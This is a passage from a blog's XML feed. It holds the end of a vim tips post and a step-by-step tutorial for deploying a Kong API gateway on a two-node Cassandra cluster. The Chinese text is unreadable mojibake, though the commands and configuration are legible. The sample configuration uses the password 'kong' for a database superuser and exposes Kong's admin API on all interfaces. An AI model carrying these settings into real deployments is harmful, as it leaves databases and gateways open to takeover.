#vimå°±ä¸ä¼šè‡ªåŠ¨ç¼©è¿›,è€Œæ˜¯çº¯æ‹·è´ç²˜è´´<br>2.åœ¨ç²˜è´´ä¹‹å,vimçª—å£ä¸­è¾“å…¥:set nopaste #å…³é—­paste</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯,å³ä½¿ç²˜è´´åä»£ç æ ¼å¼å˜çš„éå¸¸æ…¢,åªè¦æ‰§è¡Œgg=Gå°±èƒ½è‡ªåŠ¨ç¼–æ’æ ¼å¼.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;vimä½¿ç”¨æŠ€å·§&quot;&gt;&lt;a href=&quot;#vimä½¿ç”¨æŠ€å·§&quot; class=&quot;headerlink&quot; title=&quot;vimä½¿ç”¨æŠ€å·§&quot;&gt;&lt;/a&gt;vimä½¿ç”¨æŠ€å·§&lt;/h2&gt;&lt;h3 id=&quot;ç§»åŠ¨å…‰æ ‡&quot;&gt;&lt;a href=&quot;#ç§»åŠ¨å…‰æ ‡&quot; class=&quot;headerlink&quot; title=&quot;ç§»åŠ¨å…‰æ ‡&quot;&gt;&lt;/a&gt;ç§»åŠ¨å…‰æ ‡&lt;/h3&gt;&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;å•è¡Œç§»åŠ¨&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;w&lt;/th&gt;
&lt;th&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;W&lt;/td&gt;
&lt;td&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´ï¼Œé•¿è·³ï¼æ¯”å¦‚ï¼etc/letsencryt è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå•è¯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;e&lt;/td&gt;
&lt;td&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯ç»“å°¾&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;E&lt;/td&gt;
&lt;td&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯ç»“å°¾,é•¿è·³&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;b&lt;/td&gt;
&lt;td&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªå•è¯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;B&lt;/td&gt;
&lt;td&gt;ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªå•è¯,é•¿è·³&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;nw&lt;/td&gt;
&lt;td&gt;nä»£è¡¨æ•°å­—,æ¯”å¦‚ç§»åŠ¨åˆ°ä¸‹5ä¸ªå•è¯çš„å¤´éƒ¨,5w&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ne&lt;/td&gt;
&lt;td&gt;nä»£è¡¨æ•°å­—,æ¯”å¦‚ç§»åŠ¨åˆ°ä¸‹5ä¸ªå•è¯çš„å°¾éƒ¨,5e&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="Linux-Basic" scheme="https://jesse.top/categories/Linux-Basic/"/>
    
      <category term="æ–‡æœ¬å¤„ç†" scheme="https://jesse.top/categories/Linux-Basic/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/"/>
    
    
      <category term="vim" scheme="https://jesse.top/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²</title>
    <link href="https://jesse.top/2018/11/21/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kong/kong+casssandra%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    <id>https://jesse.top/2018/11/21/Linux-åˆ†å¸ƒå¼&amp;æ¶ˆæ¯é˜Ÿåˆ—/kong/kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²/</id>
    <published>2018-11-20T21:22:58.000Z</published>
    <updated>2019-02-17T09:31:38.016Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kong-casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²"><a href="#kong-casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²"></a>kong+casssandraé›†ç¾¤ç¯å¢ƒéƒ¨ç½²</h2><h3 id="kongç®€ä»‹"><a href="#kongç®€ä»‹" class="headerlink" title="kongç®€ä»‹"></a>kongç®€ä»‹</h3><p>Kongæ˜¯Mashapeå¼€æºçš„ä¸€æ¬¾APIç½‘å…³ï¼Œèµ·åˆæ˜¯ç”¨æ¥ç®¡ç† Mashape å…¬å¸15000ä¸ªå¾®æœåŠ¡çš„ï¼Œåæ¥åœ¨2015å¹´å¼€æº,ç°åœ¨å·²ç»åœ¨å¾ˆå¤šåˆ›ä¸šå…¬å¸ã€å¤§å‹ä¼ä¸šå’Œæ”¿åºœæœºæ„ä¸­å¹¿æ³›ä½¿ç”¨ã€‚åŸºäºnginx,Luaå’ŒCassandraæˆ–PostgreSQLï¼Œæ”¯æŒåˆ†å¸ƒå¼æ“ä½œï¼Œæœ‰å¾ˆå¼ºçš„å¯ç§»æ¤æ€§å’Œå¯æ‰©å±•æ€§ã€‚å¯ä»¥åœ¨ä»»ä½•ä¸€ç§åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œ,ä½œä¸ºåº”ç”¨å’ŒAPIä¹‹é—´çš„ä¸­é—´å±‚ï¼ŒåŠ ä¸Šä¼—å¤šåŠŸèƒ½å¼ºå¤§çš„æ’ä»¶ï¼Œå¯ä»¥å®ç°è®¤è¯æˆæƒã€è®¿é—®æ§åˆ¶ç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æä¾›æ˜“äºä½¿ç”¨çš„RESTful APIæ¥æ“ä½œå’Œé…ç½®ç³»ç»Ÿã€‚</p><p>æœ‰å…³kongçš„è¯¦ç»†ä»‹ç»è¯·å‚è€ƒå®˜ç½‘.</p><a id="more"></a><p>â€“</p><h3 id="cassandraç®€ä»‹"><a href="#cassandraç®€ä»‹" class="headerlink" title="cassandraç®€ä»‹"></a>cassandraç®€ä»‹</h3><p>Cassandra æ˜¯ä¸€ä¸ªæ¥è‡ª Apache çš„åˆ†å¸ƒå¼æ•°æ®åº“ï¼Œå…·æœ‰é«˜åº¦å¯æ‰©å±•æ€§ï¼Œå¯ç”¨äºç®¡ç†å¤§é‡çš„ç»“æ„åŒ–æ•°æ®ã€‚å®ƒæä¾›äº†é«˜å¯ç”¨æ€§ï¼Œæ²¡æœ‰å•ç‚¹æ•…éšœã€‚kongæ”¯æŒPostgreSQLæˆ–è€…Cassandraä¸¤ç§æ•°æ®åº“.è¿™é‡Œæˆ‘ä»¬é€‰æ‹©äº†cassandra.</p><p>æœ‰å…³cassandraçš„è¯¦ç»†ä»‹ç»å’Œä½¿ç”¨æ–¹æ³•.è¯·å‚è€ƒå®˜ç½‘</p><p>â€“</p><h3 id="é›†ç¾¤æ¶æ„"><a href="#é›†ç¾¤æ¶æ„" class="headerlink" title="é›†ç¾¤æ¶æ„"></a>é›†ç¾¤æ¶æ„</h3><ul><li><strong>kong cluster</strong></li></ul><p>kong é›†ç¾¤å¹¶ä¸æ„å‘³ç€å®¢æˆ·ç«¯è¯·æ±‚å°†ä¼šè´Ÿè½½å‡è¡¡åˆ°kongé›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šï¼Œkongé›†ç¾¤å¹¶ä¸æ˜¯å¼€ç®±å³ç”¨ï¼Œä»ç„¶éœ€è¦åœ¨kongé›†ç¾¤å¤šèŠ‚ç‚¹ä¸Šå±‚æ­å»ºè´Ÿè½½å‡è¡¡ï¼Œä»¥ä¾¿åˆ†å‘è¯·æ±‚ã€‚ ä¸€ä¸ªkongé›†ç¾¤åªæ˜¯æ„å‘³ç€é›†ç¾¤å†…çš„èŠ‚ç‚¹ï¼Œéƒ½å…±äº«åŒæ ·çš„é…ç½®ã€‚</p><p>æœ‰å…³Kong clusteré›†ç¾¤çš„è¯¦ç»†ä»‹ç»è¯·å‚è€ƒå®˜ç½‘:<a href="https://docs.konghq.com/0.14.x/clustering/" target="_blank" rel="noopener">Kong cluser document</a></p><p>ä¸ºäº†æé«˜å†—ä½™æ€§å’Œå¥å£®æ€§.æˆ‘ä»¬å¯¹kongçš„æ¯ä¸ªç¯èŠ‚éƒ½è¿›è¡Œäº†å†—ä½™è®¾è®¡.ä¸€ä¸ªåŸºæœ¬çš„kongé›†ç¾¤æ¶æ„å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="http://pabkmteb4.bkt.clouddn.com/kong-flow.png" alt=""></p><p>â€“</p><h3 id="éƒ¨ç½²æ­¥éª¤"><a href="#éƒ¨ç½²æ­¥éª¤" class="headerlink" title="éƒ¨ç½²æ­¥éª¤"></a>éƒ¨ç½²æ­¥éª¤</h3><p><strong>ç¯å¢ƒ</strong>: </p><p>é˜¿é‡Œäº‘ECS Centos7.4æ“ä½œç³»ç»Ÿ<br>Kong: 0.14 æœ€æ–°ç‰ˆ<br>Cassandra: 3.11 æœ€æ–°ç‰ˆ</p><p>â€“</p><h4 id="å®‰è£…Cassandra"><a href="#å®‰è£…Cassandra" class="headerlink" title="å®‰è£…Cassandra"></a>å®‰è£…Cassandra</h4><p>å®‰è£…æ–¹å¼å®˜ç½‘å‚è€ƒ: <a href="http://cassandra.apache.org/doc/latest/getting_started/installing.html#installation-from-binary-tarball-files" target="_blank" rel="noopener">Installing Cassandra</a></p><p><strong>å®‰è£…å‰ææ¡ä»¶</strong></p><p>1.å®‰è£…JDK 8ç‰ˆæœ¬<br>2.å®‰è£…2.7ä»¥ä¸Šç‰ˆæœ¬çš„Python.(cassandraç®¡ç†å·¥å…·:cqlsh éœ€è¦python2.7ä»¥ä¸Šç¯å¢ƒ)</p><p><strong>å®‰è£…æ­¥éª¤</strong></p><p>1.ä¸‹è½½cassandraäºŒè¿›åˆ¶æ–‡ä»¶.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirrors.tuna.tsinghua.edu.cn/apache/cassandra/3.11.3/apache-cassandra-3.11.3-bin.tar.gz</span><br></pre></td></tr></table></figure><p>2.å°†cassandraç›®å½•æ·»åŠ è¿›ç¯å¢ƒå˜é‡.ç”¨workç”¨æˆ·è¿è¡Œcassandra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/local/cassandra</span><br><span class="line">sudo chown -R work:work /usr/local/cassandra</span><br><span class="line">sudo tar -xvf apache-cassandra-3.11.3-bin.tar.gz -C /usr/local/cassandra</span><br><span class="line"></span><br><span class="line">cd /usr/local/cassandra</span><br><span class="line">sudo mv apache-cassandra-3.11.3/* .</span><br><span class="line">sudo rm apache-cassandra-3.11.3/ -rf</span><br></pre></td></tr></table></figure><p>æ·»åŠ è¿›ç¯å¢ƒå˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"></span><br><span class="line">export JAVA_HOME=/usr/local/java</span><br><span class="line">export CASSANDRA_HOME=/usr/local/cassandra</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin:$CASSANDRA_HOME/bin</span><br></pre></td></tr></table></figure><p>â€“</p><h4 id="é…ç½®Cassandra-ä»¥åŠcassandraé›†ç¾¤"><a href="#é…ç½®Cassandra-ä»¥åŠcassandraé›†ç¾¤" class="headerlink" title="é…ç½®Cassandra,ä»¥åŠcassandraé›†ç¾¤"></a>é…ç½®Cassandra,ä»¥åŠcassandraé›†ç¾¤</h4><p>1.ç¼–è¾‘cassandraçš„cassandra.ymlé…ç½®æ–‡ä»¶.ä¿®æ”¹ä¸‹åˆ—é…ç½®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 kong]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line"></span><br><span class="line">#å®šä¹‰Cassandraé›†ç¾¤å</span><br><span class="line">cluster_name: &apos;dwd_cassandra&apos;</span><br><span class="line">#å®šä¹‰hintsè·¯å¾„.å¯ä»¥ä½¿ç”¨é»˜è®¤è·¯å¾„</span><br><span class="line">hints_directory: /data/cassandra/hints</span><br><span class="line"></span><br><span class="line">#é‡‡ç”¨å¯†ç æ–¹å¼è¿æ¥æ•°æ®åº“.é»˜è®¤æƒ…å†µä¸‹ä¸éœ€è¦ä»»ä½•ç”¨æˆ·å¯†ç å°±å¯ä»¥ç™»å½•æ•°æ®åº“</span><br><span class="line">authenticator: PasswordAuthenticator</span><br><span class="line"></span><br><span class="line">#å®šä¹‰æ•°æ®åº“æ–‡ä»¶è·¯å¾„.å¯ä»¥ä½¿ç”¨é»˜è®¤/var/libè·¯å¾„</span><br><span class="line">data_file_directories:</span><br><span class="line">      - /data/cassandra</span><br><span class="line"></span><br><span class="line">#å®šä¹‰commitæ—¥å¿—è·¯å¾„.å¯ä»¥ä½¿ç”¨é»˜è®¤è·¯å¾„</span><br><span class="line">commitlog_directory: /data/cassandra/commitlog</span><br><span class="line"></span><br><span class="line">#ç¼“å­˜æ–‡ä»¶è·¯å¾„</span><br><span class="line">saved_caches_directory: /data/cassandra/saved_caches</span><br><span class="line"></span><br><span class="line">#å…³é”®é…ç½®,å®šä¹‰é›†ç¾¤ç§å­æœåŠ¡å™¨åœ°å€.è¿™é‡Œå®šä¹‰æœåŠ¡å™¨çš„å†…ç½‘åœ°å€.ä¸èƒ½ä½¿ç”¨0.0.0.0æˆ–è€…127çš„æœ¬æœºåœ°å€,å¯ä»¥åŠ å…¥å¤šä¸ªé›†ç¾¤èŠ‚ç‚¹çš„åœ°å€,IPåœ°å€ä¹‹é—´ç”¨é€—å·åˆ†éš”</span><br><span class="line">- seeds: &quot;10.25.87.159&quot;</span><br><span class="line"></span><br><span class="line">#listenåœ°å€</span><br><span class="line">listen_address: 10.25.87.159</span><br><span class="line"></span><br><span class="line">#rpcåœ°å€</span><br><span class="line">rpc_address: 10.25.87.159</span><br></pre></td></tr></table></figure><p>2.åˆ›å»ºåˆšæ‰å®šä¹‰çš„è·¯å¾„ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -pv /data/cassandra </span><br><span class="line">sudo chown -R work.work /data/</span><br></pre></td></tr></table></figure><p>3.å¯åŠ¨cassandra.ç›´æ¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œcassandra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 kong]$ cassandra </span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line"></span><br><span class="line">[work@kong-node1 kong]$ /usr/local/cassandra/bin/cassandra</span><br></pre></td></tr></table></figure><ol start="4"><li>ä½¿ç”¨cqlshå·¥å…·ç™»é™†cassandraæ•°æ®åº“.åˆ›å»ºcassandraç”¨æˆ·å¯†ç ,ä»¥åŠåˆ›å»ºé”®ç©ºé—´</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨æ„ç”±äºcassandraåªä¾¦å¬äº†å†…ç½‘çš„åœ°å€,å› æ­¤è¦æŒ‡å®šIPåœ°å€.</span><br><span class="line">#é»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯cassandra</span><br><span class="line">[work@kong-node1 kong]$ cqlsh 10.25.87.159  -ucassandra -pcassandra </span><br><span class="line"></span><br><span class="line">#åˆ›å»ºä¸€ä¸ªkongç”¨æˆ·.å¹¶ä¸”ä¸ºè¶…çº§ç”¨æˆ·</span><br><span class="line">cassandra@cqlsh&gt; create user kong with password &apos;kong&apos; superuser;</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºä¸€ä¸ªkeyspace.å‘½åä¸ºkong</span><br><span class="line">cassandra@cqlsh&gt; CREATE KEYSPACE kong WITH REPLICATION = &#123; &apos;class&apos; : &apos;SimpleStrategy&apos;, &apos;replication_factor&apos; : 1&#125;;</span><br><span class="line"></span><br><span class="line">cassandra@cqlsh&gt; exit</span><br></pre></td></tr></table></figure><p>5.åˆ é™¤è‡ªå¸¦çš„cassandraç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[work@kong-node1 cassandra]$ cqlsh 10.25.87.159  -ukong -pkong</span><br><span class="line">kong@cqlsh&gt; desc kong;</span><br><span class="line"></span><br><span class="line">CREATE KEYSPACE kong WITH replication = &#123;&apos;class&apos;: &apos;SimpleStrategy&apos;, &apos;replication_factor&apos;: &apos;1&apos;&#125;  AND durable_writes = true;</span><br><span class="line"></span><br><span class="line">kong@cqlsh&gt; drop user cassandra;</span><br></pre></td></tr></table></figure><p>â€“</p><h4 id="å®‰è£…Kong"><a href="#å®‰è£…Kong" class="headerlink" title="å®‰è£…Kong"></a>å®‰è£…Kong</h4><p>å®‰è£…æ–¹æ³•å¯ä»¥å‚è€ƒå®˜ç½‘:<a href="https://docs.konghq.com/install/centos/?_ga=2.110797315.728319704.1539597667-917309945.1539077269#packages" target="_blank" rel="noopener">Install Kong</a></p><p>1.ä¸‹è½½,å®‰è£…rpmå®‰è£…åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -O kong-community-edition-0.14.1.el7.noarch.rpm  https://bintray.com/kong/kong-community-edition-rpm/download_file?file_path=centos/7/kong-community-edition-0.14.1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum install kong-community-edition-0.14.1.el7.noarch.rpm</span><br></pre></td></tr></table></figure><p>2.ä¿®æ”¹é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/kong</span><br><span class="line">sudo cp kong.conf.default kong.conf</span><br><span class="line"></span><br><span class="line">sudo vim kong.conf</span><br><span class="line"></span><br><span class="line">#ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line">prefix = /data/kong/</span><br><span class="line"></span><br><span class="line">#ç”±äºç£ç›˜ç©ºé—´æœ‰é™,å…³é—­kongçš„ä»£ç†æ—¥å¿—.åç«¯çœŸå®æœåŠ¡å™¨ä¼šè®°å½•nginxè®¿é—®æ—¥å¿—</span><br><span class="line">proxy_access_log = off</span><br><span class="line">proxy_error_log = off</span><br><span class="line"></span><br><span class="line">#åœ¨æ‰€æœ‰åœ°å€ä¾¦å¬ç®¡ç†ç«¯å£,å½“ç„¶åªä¾¦å¬127åœ°å€ä¼šæ›´å®‰å…¨.</span><br><span class="line">admin_listen = 0.0.0.0:8001, 0.0.0.0:8444 ssl</span><br><span class="line"></span><br><span class="line">#æŒ‡å®šä½¿ç”¨cassandraæ•°æ®åº“</span><br><span class="line">database = cassandra</span><br><span class="line">#æ•°æ®åº“åœ°å€,ç«¯å£</span><br><span class="line">cassandra_contact_points = 10.25.87.159</span><br><span class="line">cassandra_port = 9042</span><br><span class="line"></span><br><span class="line">#ä¸Šæ–‡å®šä¹‰çš„cassandraæ•°æ®åº“çš„ç”¨æˆ·å¯†ç å’Œé”®ç©ºé—´</span><br><span class="line">cassandra_keyspace = kong</span><br><span class="line">cassandra_username = kong</span><br><span class="line">cassandra_password = kong</span><br><span class="line"></span><br><span class="line">#kongå®˜æ–¹å»ºè®®çš„cassandraä¸€è‡´æ€§æœºåˆ¶</span><br><span class="line">cassandra_consistency = QUORUM</span><br><span class="line"></span><br><span class="line">#ä»¥ä¸‹æ˜¯é›†ç¾¤çš„æ•°æ®åº“å’Œç¼“å­˜æ–¹é¢çš„é…ç½®.è¯¦ç»†ä»‹ç»è¯·å‚è€ƒå®˜ç½‘</span><br><span class="line">db_update_frequency = 5</span><br><span class="line">db_update_propagation = 2</span><br></pre></td></tr></table></figure><p>3.åˆ›å»ºkongç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data/kong</span><br></pre></td></tr></table></figure><p>4.å‡†å¤‡å¯åŠ¨å·¥ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kong migrations up -c /etc/kong/kong.conf</span><br></pre></td></tr></table></figure><p>5.å¯åŠ¨kong</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kong start -c /etc/kong/kong.conf</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç«¯å£.å¯ä»¥çœ‹åˆ°cassandraå’Œkongçš„ä¾¦å¬ç«¯å£éƒ½å·²ç»æˆåŠŸå¯åŠ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node1 kong]$ netstat -tulnp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 0.0.0.0:8444            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 127.0.0.1:7199          0.0.0.0:*               LISTEN      28598/java</span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 0.0.0.0:8001            0.0.0.0:*               LISTEN      29342/nginx: master</span><br><span class="line">tcp        0      0 127.0.0.1:35503         0.0.0.0:*               LISTEN      28598/java</span><br><span class="line">tcp        0      0 10.25.87.159:9042       0.0.0.0:*               LISTEN      28598/java</span><br><span class="line">tcp        0      0 10.25.87.159:7000       0.0.0.0:*               LISTEN      28598/java</span><br></pre></td></tr></table></figure><hr><h3 id="éƒ¨ç½²å¦å¤–ä¸€å°kongå’Œcassandra"><a href="#éƒ¨ç½²å¦å¤–ä¸€å°kongå’Œcassandra" class="headerlink" title="éƒ¨ç½²å¦å¤–ä¸€å°kongå’Œcassandra"></a>éƒ¨ç½²å¦å¤–ä¸€å°kongå’Œcassandra</h3><p>ä»Šå¤©åœ¨é˜¿é‡Œäº‘é•œåƒäº†kong-node1çš„æœåŠ¡å™¨.æ–°çš„æœåŠ¡å™¨åå­—ä¸ºkong-node2.<br>è½¯ä»¶å·²ç»å®‰è£…,åªéœ€è¦ä¿®æ”¹éƒ¨åˆ†é…ç½®</p><h5 id="ä¿®æ”¹node1å’Œnode2ä¸Šçš„cassandraé…ç½®"><a href="#ä¿®æ”¹node1å’Œnode2ä¸Šçš„cassandraé…ç½®" class="headerlink" title="ä¿®æ”¹node1å’Œnode2ä¸Šçš„cassandraé…ç½®"></a>ä¿®æ”¹node1å’Œnode2ä¸Šçš„cassandraé…ç½®</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">åœ¨node1å’Œnode2ä¸Š:</span><br><span class="line">[work@kong-node2 ~]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line">#ä¿®æ”¹seedsé…ç½®.æ·»åŠ 2å°æœåŠ¡å™¨çš„å†…ç½‘IPåœ°å€</span><br><span class="line">- seeds: &quot;10.25.87.159, 10.80.229.244&quot; </span><br><span class="line"></span><br><span class="line">åœ¨node2ä¸Šä¿®æ”¹ä¾¦å¬åœ°å€</span><br><span class="line">[work@kong-node2 ~]$ vim /usr/local/cassandra/conf/cassandra.yaml</span><br><span class="line">#å°†ä¸‹åˆ—åœ°å€æ”¹æˆnode2å†…ç½‘åœ°å€</span><br><span class="line">listen_address: 10.80.229.244</span><br><span class="line">rpc_address: 10.80.229.244</span><br></pre></td></tr></table></figure><h5 id="åœ¨node2ä¸Šä¿®æ”¹kongçš„é…ç½®æ–‡ä»¶"><a href="#åœ¨node2ä¸Šä¿®æ”¹kongçš„é…ç½®æ–‡ä»¶" class="headerlink" title="åœ¨node2ä¸Šä¿®æ”¹kongçš„é…ç½®æ–‡ä»¶:"></a>åœ¨node2ä¸Šä¿®æ”¹kongçš„é…ç½®æ–‡ä»¶:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">work@kong-node2 ~]$ vim /etc/kong/kong.conf</span><br><span class="line">#è¿æ¥æœ¬æœºçš„cassandraæ•°æ®åº“åœ°å€</span><br><span class="line">cassandra_contact_points = 10.80.229.244</span><br></pre></td></tr></table></figure><blockquote><p>note:åƒä¸‡ä¸è¦å¯åŠ¨node2ä¸Šçš„cassandra.å› ä¸ºnode2æ˜¯ä»node1é•œåƒè¿‡å»çš„.æ‰€ä»¥æ•°æ®åº“çš„tokenæ˜¯ä¸€æ¨¡ä¸€æ ·çš„.</p></blockquote><h5 id="åœ¨node2ä¸Šåˆ é™¤cassandraçš„æ•°æ®åº“-è¿™ä¸€æ­¥éå¸¸é‡è¦-å› ä¸ºè¿™æ˜¯ä»node1é•œåƒè¿‡æ¥çš„-æ‰€ä»¥node2ä¸Šçš„æ•°æ®åº“æ˜¯node1çš„æ•°æ®"><a href="#åœ¨node2ä¸Šåˆ é™¤cassandraçš„æ•°æ®åº“-è¿™ä¸€æ­¥éå¸¸é‡è¦-å› ä¸ºè¿™æ˜¯ä»node1é•œåƒè¿‡æ¥çš„-æ‰€ä»¥node2ä¸Šçš„æ•°æ®åº“æ˜¯node1çš„æ•°æ®" class="headerlink" title="åœ¨node2ä¸Šåˆ é™¤cassandraçš„æ•°æ®åº“.è¿™ä¸€æ­¥éå¸¸é‡è¦.å› ä¸ºè¿™æ˜¯ä»node1é•œåƒè¿‡æ¥çš„.æ‰€ä»¥node2ä¸Šçš„æ•°æ®åº“æ˜¯node1çš„æ•°æ®"></a>åœ¨node2ä¸Šåˆ é™¤cassandraçš„æ•°æ®åº“.è¿™ä¸€æ­¥éå¸¸é‡è¦.å› ä¸ºè¿™æ˜¯ä»node1é•œåƒè¿‡æ¥çš„.æ‰€ä»¥node2ä¸Šçš„æ•°æ®åº“æ˜¯node1çš„æ•°æ®</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 